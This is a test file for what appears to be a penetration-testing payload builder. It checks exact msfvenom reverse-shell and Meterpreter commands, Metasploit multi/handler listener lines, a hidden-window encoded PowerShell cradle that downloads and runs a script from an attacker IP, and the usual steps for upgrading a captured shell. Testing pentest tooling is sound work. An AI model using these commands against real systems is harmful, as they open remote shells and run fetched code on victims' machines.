import { describe, expect, it } from "vitest";
import { decodeUtf16leBase64 } from "../../../engines/payloads/encode";
import { buildPayload } from "../../../engines/payloads/build";
import { rankPayloads, type PayloadSituation } from "../../../engines/payloads/fit";
import { MSFVENOM } from "../../../engines/payloads/msfvenom";
import { encodePs } from "../../../engines/payloads/encodePs";
import { UPGRADE } from "../../../engines/payloads/upgrade";
import type { PayloadDef } from "../../../engines/payloads/types";

const vals = { LHOST: "192.0.2.10", LPORT: "443" };
const pOf = (d: PayloadDef) => /-p\s+(\S+)/.exec(d.template)![1];

describe("MSFVENOM", () => {
  it("every def is a bakesIp msfvenom def with a msfPayload; Meterpreter defs set the lock flag", () => {
    expect(MSFVENOM.length).toBeGreaterThanOrEqual(14);
    for (const d of MSFVENOM) {
      expect(d.bakesIp).toBe(true);
      expect(d.generator).toBe("msfvenom");
      expect(d.msfPayload).toBe(pOf(d));
      expect(Boolean(d.meterpreter)).toBe(/meterpreter/.test(pOf(d)));
      expect(d.requires).toEqual(["served-file"]);
    }
  });
  it("covers the required payload/format pairs", () => {
    const pairs = MSFVENOM.map((d) => `${pOf(d)}:${/-f\s+(\S+)/.exec(d.template)![1]}`);
    for (const p of [
      "windows/x64/shell_reverse_tcp:exe", "windows/x64/shell_reverse_tcp:dll", "windows/x64/shell_reverse_tcp:hta-psh",
      "windows/shell_reverse_tcp:exe", "linux/x64/shell_reverse_tcp:elf", "windows/x64/shell_reverse_tcp:aspx",
      "java/jsp_shell_reverse_tcp:war",
    ]) expect(pairs).toContain(p);
    expect(new Set(MSFVENOM.map((d) => d.id)).size).toBe(MSFVENOM.length);
  });
  it("builds a clean command with parts for -p LHOST LPORT -f -o", () => {
    const b = buildPayload(MSFVENOM.find((d) => d.id === "msf-win-x64-exe")!, "bash-prompt", vals);
    expect(b.text).toBe("msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.0.2.10 LPORT=443 -f exe -o rev.exe");
    expect(b.unresolved).toEqual([]);
    for (const t of ["-p", "LHOST", "LPORT", "-f", "-o"]) expect(b.parts.some((p) => p.token.startsWith(t))).toBe(true);
    expect(b.listener).toBe("penelope -O -p 443");
    expect(b.notes.join(" ")).toMatch(/or nc; no multi\/handler needed for stageless shell/);
  });
  it("x86 exe carries the Veil/Shellter note", () => {
    const d = MSFVENOM.find((x) => pOf(x) === "windows/shell_reverse_tcp" && x.template.includes("-f exe"))!;
    expect((d.notes ?? []).join(" ")).toContain("x86 for Veil/Shellter");
  });
  it("every def is a fit in exam mode", () => {
    const s: PayloadSituation = {
      os: null, services: [], prompt: null, webShellUrl: null, tools: { present: [], absent: [] },
      failedPayloadIds: [], exam: true, dbEngine: null,
    };
    const r = rankPayloads(MSFVENOM, s, null);
    expect(r.misfits).toEqual([]);
    expect(r.fits).toHaveLength(MSFVENOM.length);
  });
  it("existing stageless defs offer multi-handler as a second listener", () => {
    expect(MSFVENOM.find((d) => d.id === "msf-win-x64-exe")!.listeners).toEqual(["penelope", "multi-handler", "rlwrap-nc"]);
  });
  const handler = (p: string) =>
    `msfconsole -q -x "use exploit/multi/handler; set payload ${p}; set LHOST 192.0.2.10; set LPORT 443; set ExitOnSession false; run -j"`;
  it.each([
    ["msf-win-x64-met-staged", "windows/x64/meterpreter/reverse_tcp", "exe", "met.exe", true],
    ["msf-win-x64-met-stageless", "windows/x64/meterpreter_reverse_tcp", "exe", "met.exe", true],
    ["msf-win-x64-shell-staged", "windows/x64/shell/reverse_tcp", "exe", "rev-staged.exe", false],
    ["msf-linux-x64-met-staged", "linux/x64/meterpreter/reverse_tcp", "elf", "met.elf", true],
    ["msf-linux-x64-met-stageless", "linux/x64/meterpreter_reverse_tcp", "elf", "met.elf", true],
    ["msf-php-met", "php/meterpreter/reverse_tcp", "raw", "met.php", true],
  ])("%s builds the exact command and handler", (id, p, fmt, file, met) => {
    const d = MSFVENOM.find((x) => x.id === id)!;
    expect(d.listeners).toEqual(["multi-handler"]);
    expect(Boolean(d.meterpreter)).toBe(met);
    const b = buildPayload(d, "bash-prompt", vals);
    expect(b.text).toBe(`msfvenom -p ${p} LHOST=192.0.2.10 LPORT=443 -f ${fmt} -o ${file}`);
    expect(b.listener).toBe(handler(p));
    expect(b.notes.join(" ")).toContain("Catch it with multi/handler: nc and penelope can't serve a stage or speak Meterpreter.");
    const explain = b.parts.find((x) => x.token.startsWith("-p"))!.explain;
    expect(explain).toMatch(p.includes("meterpreter_") ? /stageless/ : /staged/);
  });
  it("php meterpreter is os any", () => {
    expect(MSFVENOM.find((d) => d.id === "msf-php-met")!.os).toBe("any");
  });
});

describe("encodePs", () => {
  it("round-trips", () => {
    const cmd = "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/rev.ps1')";
    const b = encodePs(cmd);
    const m = /^powershell -nop -w hidden -e (\S+)$/.exec(b.text)!;
    expect(decodeUtf16leBase64(m[1])).toBe(cmd);
    expect(b.notes).toContain(`Decodes to: ${cmd}`);
    expect(b.def.generator).toBe("encode");
    expect(b.def.os).toBe("windows");
    expect(b.parts.map((p) => p.token)).toEqual(expect.arrayContaining(["-nop", "-w hidden", "-e"]));
    expect(b.parts.map((p) => p.explain).join(" ")).toMatch(/UTF-16LE/);
    expect(b.unresolved).toEqual([]);
  });
});

describe("UPGRADE", () => {
  it("upgrade steps are in order", () => {
    expect(UPGRADE.map((d) => d.template)).toEqual([
      `python3 -c 'import pty; pty.spawn("/bin/bash")'`,
      "script -qc /bin/bash /dev/null",
      "Ctrl-Z",
      "stty raw -echo; fg",
      "export TERM=xterm-256color",
      "stty rows {ROWS} cols {COLS}",
      "export HOME=/home/{USER}",
    ]);
    for (const d of UPGRADE) {
      expect(d.generator).toBe("upgrade");
      expect(d.os).toBe("linux");
      expect(d.contexts).toEqual(["bash-prompt"]);
      expect(d.listeners).toEqual([]);
    }
    expect(new Set(UPGRADE.map((d) => d.id)).size).toBe(UPGRADE.length);
  });
  it("notes: HOME trap and penelope", () => {
    const home = UPGRADE[UPGRADE.length - 1];
    expect((home.notes ?? []).join(" ")).toContain("when the shell inherited root's HOME");
    expect(UPGRADE.flatMap((d) => d.notes ?? []).join(" ")).toMatch(/penelope upgrades on its own/i);
  });
  it("stty step has placeholders with defaults", () => {
    const b = buildPayload(UPGRADE[5], "bash-prompt", {});
    expect(b.text).toMatch(/^stty rows \d+ cols \d+$/);
  });
});
